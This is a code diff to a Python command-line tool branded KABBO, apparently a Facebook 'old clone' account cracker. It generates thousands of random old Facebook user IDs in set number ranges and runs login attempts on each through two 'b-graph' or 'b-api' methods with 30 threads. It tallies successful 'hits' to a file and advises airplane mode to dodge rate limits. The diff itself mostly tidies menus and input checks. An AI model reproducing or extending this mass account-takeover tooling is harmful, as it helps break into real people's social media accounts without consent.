@@ -6,12 +6,8 @@ from concurrent.futures import ThreadPoolExecutor as tred
 from config import (rad, Y, G, W, CY, BL, RESET, DIM,
                     TOOL_NAME, TOOL_VERSION, TOOL_AUTHOR,
                     TOOL_FB, TOOL_GITHUB, TOOL_TG)
-from utils import linex
+from utils import box_line
 from login import login_1, login_2
-
-
-def _box_line(char='━', color='\x1b[38;5;240m', length=47):
-    print(f"{color}{char * length}{RESET}")
 
 
 def banner():
@@ -24,47 +20,104 @@ def banner():
 {Y}  ██║  ██╗██║  ██║██████╔╝██████╔╝╚██████╔╝
 {Y}  ╚═╝  ╚═╝╚═╝  ╚═╝╚═════╝ ╚═════╝  ╚═════╝{RESET}
 {DIM}  ─────────────────────────────────────────────{RESET}
-  {W}Tool{RESET}     {DIM}│{RESET}  {G}{TOOL_NAME} {TOOL_VERSION}{RESET}
-  {W}Author{RESET}   {DIM}│{RESET}  {Y}{TOOL_AUTHOR}{RESET}
+  {W}Tool    {RESET} {DIM}│{RESET}  {G}{TOOL_NAME} {TOOL_VERSION}{RESET}
+  {W}Author  {RESET} {DIM}│{RESET}  {Y}{TOOL_AUTHOR}{RESET}
   {W}Facebook{RESET} {DIM}│{RESET}  {CY}{TOOL_FB}{RESET}
-  {W}GitHub{RESET}   {DIM}│{RESET}  {CY}{TOOL_GITHUB}{RESET}
+  {W}GitHub  {RESET} {DIM}│{RESET}  {CY}{TOOL_GITHUB}{RESET}
   {W}Telegram{RESET} {DIM}│{RESET}  {CY}{TOOL_TG}{RESET}
 {DIM}  ─────────────────────────────────────────────{RESET}
   {G}✦  WIFI + MOBILE DATA SUPPORTED{RESET}
 {DIM}  ─────────────────────────────────────────────{RESET}""")
 
 
-def _menu_item(key, label):
-    print(f"  {CY}[{W}{key}{CY}]{RESET}  {G}{label}{RESET}")
+def _menu_item(key, label, desc=''):
+    suffix = f"  {DIM}{desc}{RESET}" if desc else ''
+    print(f"  {CY}[{W}{key}{CY}]{RESET}  {G}{label}{RESET}{suffix}")
 
 
 def _prompt(label):
-    return input(f"\n  {CY}❯{RESET} {W}{label}{RESET} : {Y}").strip()
+    val = input(f"\n  {CY}❯{RESET} {W}{label}{RESET} : {Y}").strip()
+    sys.stdout.write(RESET)
+    sys.stdout.flush()
+    return val
+
+
+def _prompt_int(label, min_val=1, max_val=999999):
+    while True:
+        raw = _prompt(f"{label}  {DIM}(e.g. 20000){RESET}")
+        if raw.isdigit() and min_val <= int(raw) <= max_val:
+            return int(raw)
+        print(f"  {rad}✘  Enter a valid number between {min_val} and {max_val}.{RESET}")
+
+
+def _select_method():
+    while True:
+        print(f"\n  {W}SELECT METHOD{RESET}")
+        box_line()
+        _menu_item('A', 'METHOD 1', 'b-graph endpoint')
+        _menu_item('B', 'METHOD 2', 'b-api endpoint')
+        box_line()
+        meth = _prompt('METHOD').upper()
+        if meth in ('A', 'B'):
+            return meth
+        print(f"  {rad}✘  Choose A or B.{RESET}")
+
+
+def _run_pool(user_list, meth, star=''):
+    import config
+    banner()
+    box_line('═', CY)
+    print(f"  {W}Total IDs {RESET} {DIM}│{RESET}  {G}{len(user_list)}{RESET}")
+    print(f"  {W}Method    {RESET} {DIM}│{RESET}  {G}{'METHOD 1' if meth == 'A' else 'METHOD 2'}{RESET}")
+    print(f"  {W}Tip       {RESET} {DIM}│{RESET}  {Y}Airplane Mode = best results{RESET}")
+    box_line('═', CY)
+    print()
+
+    with tred(max_workers=30) as pool:
+        for item in user_list:
+            uid = star + item if star else item
+            if meth == 'A':
+                pool.submit(login_1, uid)
+            elif meth == 'B':
+                pool.submit(login_2, uid)
+
+    # ── Summary ──────────────────────────────────────────────
+    print()
+    box_line('═', CY)
+    print(f"  {W}SCAN COMPLETE{RESET}")
+    box_line()
+    print(f"  {W}Total Tried {RESET} {DIM}│{RESET}  {CY}{config.loop}{RESET}")
+    print(f"  {W}Total Hits  {RESET} {DIM}│{RESET}  {G}{len(config.oks)}{RESET}")
+    saved = '/sdcard/KABBO-M1-HITS.txt' if meth == 'A' else '/sdcard/KABBO-M2-HITS.txt'
+    print(f"  {W}Saved To    {RESET} {DIM}│{RESET}  {Y}{saved}{RESET}")
+    box_line('═', CY)
+    input(f"\n  {DIM}Press Enter to return to menu...{RESET}")
+    BNG_71_()
 
 
 def BNG_71_():
     banner()
     print(f"\n  {W}SELECT MODULE{RESET}")
-    _box_line()
+    box_line()
     _menu_item('A', 'OLD CLONE')
-    _box_line()
+    box_line()
     choice = _prompt('CHOOSE')
     if choice.upper() in ('A', '1'):
         old_clone()
     else:
         print(f"\n  {rad}✘  Invalid option.{RESET}")
-        time.sleep(1.5)
+        time.sleep(1.2)
         BNG_71_()
 
 
 def old_clone():
     banner()
     print(f"\n  {W}SELECT SERIES{RESET}")
-    _box_line()
-    _menu_item('A', 'ALL SERIES')
-    _menu_item('B', '100003 / 100004 SERIES')
-    _menu_item('C', '2009 SERIES')
-    _box_line()
+    box_line()
+    _menu_item('A', 'ALL SERIES',            '2010 – 2014 range')
+    _menu_item('B', '100003 / 100004 SERIES', '2011 – 2012 range')
+    _menu_item('C', '2009 SERIES',            '1000004x prefix')
+    box_line()
     choice = _prompt('CHOOSE')
     if choice.upper() in ('A', '1'):
         old_One()
@@ -74,47 +127,24 @@ def old_clone():
         old_Tree()
     else:
         print(f"\n  {rad}✘  Invalid option.{RESET}")
-        time.sleep(1.5)
-        BNG_71_()
-
-
-def _select_method():
-    print(f"\n  {W}SELECT METHOD{RESET}")
-    _box_line()
-    _menu_item('A', 'METHOD 1')
-    _menu_item('B', 'METHOD 2')
-    _box_line()
-    return _prompt('METHOD (A/B)').upper()
-
-
-def _run_pool(user_list, meth, star=''):
-    banner()
-    _box_line()
-    print(f"  {W}Total IDs  {RESET}{DIM}│{RESET}  {G}{len(user_list)}{RESET}")
-    print(f"  {W}Method     {RESET}{DIM}│{RESET}  {G}{meth}{RESET}")
-    print(f"  {W}Tip        {RESET}{DIM}│{RESET}  {Y}Use Airplane Mode for best results{RESET}")
-    _box_line()
-    with tred(max_workers=30) as pool:
-        for item in user_list:
-            uid = star + item if star else item
-            if meth == 'A':
-                pool.submit(login_1, uid)
-            elif meth == 'B':
-                pool.submit(login_2, uid)
-            else:
-                print(f"  {rad}✘  Invalid method.{RESET}")
-                break
+        time.sleep(1.2)
+        old_clone()
 
 
 def old_One():
     user = []
     banner()
-    print(f"\n  {W}OLD CLONE  {DIM}│{RESET}  {G}2010 – 2014{RESET}")
-    _box_line()
-    ask   = _prompt('SERIES SELECT')
-    limit = _prompt('TOTAL IDs  (e.g. 20000)')
+    print(f"\n  {W}OLD CLONE  {DIM}│{RESET}  {G}ALL SERIES  (2010 – 2014){RESET}")
+    box_line()
+    print(f"  {DIM}[1]{RESET}  Range  {Y}1000000000 – 1999999999{RESET}")
+    print(f"  {DIM}[2]{RESET}  Range  {Y}1000000000 – 4999999999{RESET}")
+    box_line()
+    ask   = _prompt('SELECT RANGE (1 / 2)')
+    if ask not in ('1', '2'):
+        ask = '1'
+    limit = _prompt_int('TOTAL IDs')
     star  = '10000'
-    for _ in range(int(limit)):
+    for _ in range(limit):
         data = str(random.choice(range(1000000000, 1999999999 if ask == '1' else 4999999999)))
         user.append(data)
     meth = _select_method()
@@ -125,10 +155,9 @@ def old_Tow():
     user = []
     banner()
     print(f"\n  {W}OLD CLONE  {DIM}│{RESET}  {G}100003 / 100004 SERIES{RESET}")
-    _box_line()
-    _prompt('SERIES SELECT')
-    limit = _prompt('TOTAL IDs  (e.g. 20000)')
-    for _ in range(int(limit)):
+    box_line()
+    limit = _prompt_int('TOTAL IDs')
+    for _ in range(limit):
         prefix = random.choice(['100003', '100004'])
         uid    = prefix + ''.join(random.choices('0123456789', k=9))
         user.append(uid)
@@ -139,11 +168,10 @@ def old_Tow():
 def old_Tree():
     user = []
     banner()
-    print(f"\n  {W}OLD CLONE  {DIM}│{RESET}  {G}2009 – 2010 SERIES{RESET}")
-    _box_line()
-    _prompt('SERIES SELECT')
-    limit = _prompt('TOTAL IDs  (e.g. 20000)')
-    for _ in range(int(limit)):
+    print(f"\n  {W}OLD CLONE  {DIM}│{RESET}  {G}2009 SERIES{RESET}")
+    box_line()
+    limit = _prompt_int('TOTAL IDs')
+    for _ in range(limit):
         uid = '1000004' + ''.join(random.choices('0123456789', k=8))
         user.append(uid)
     meth = _select_method()
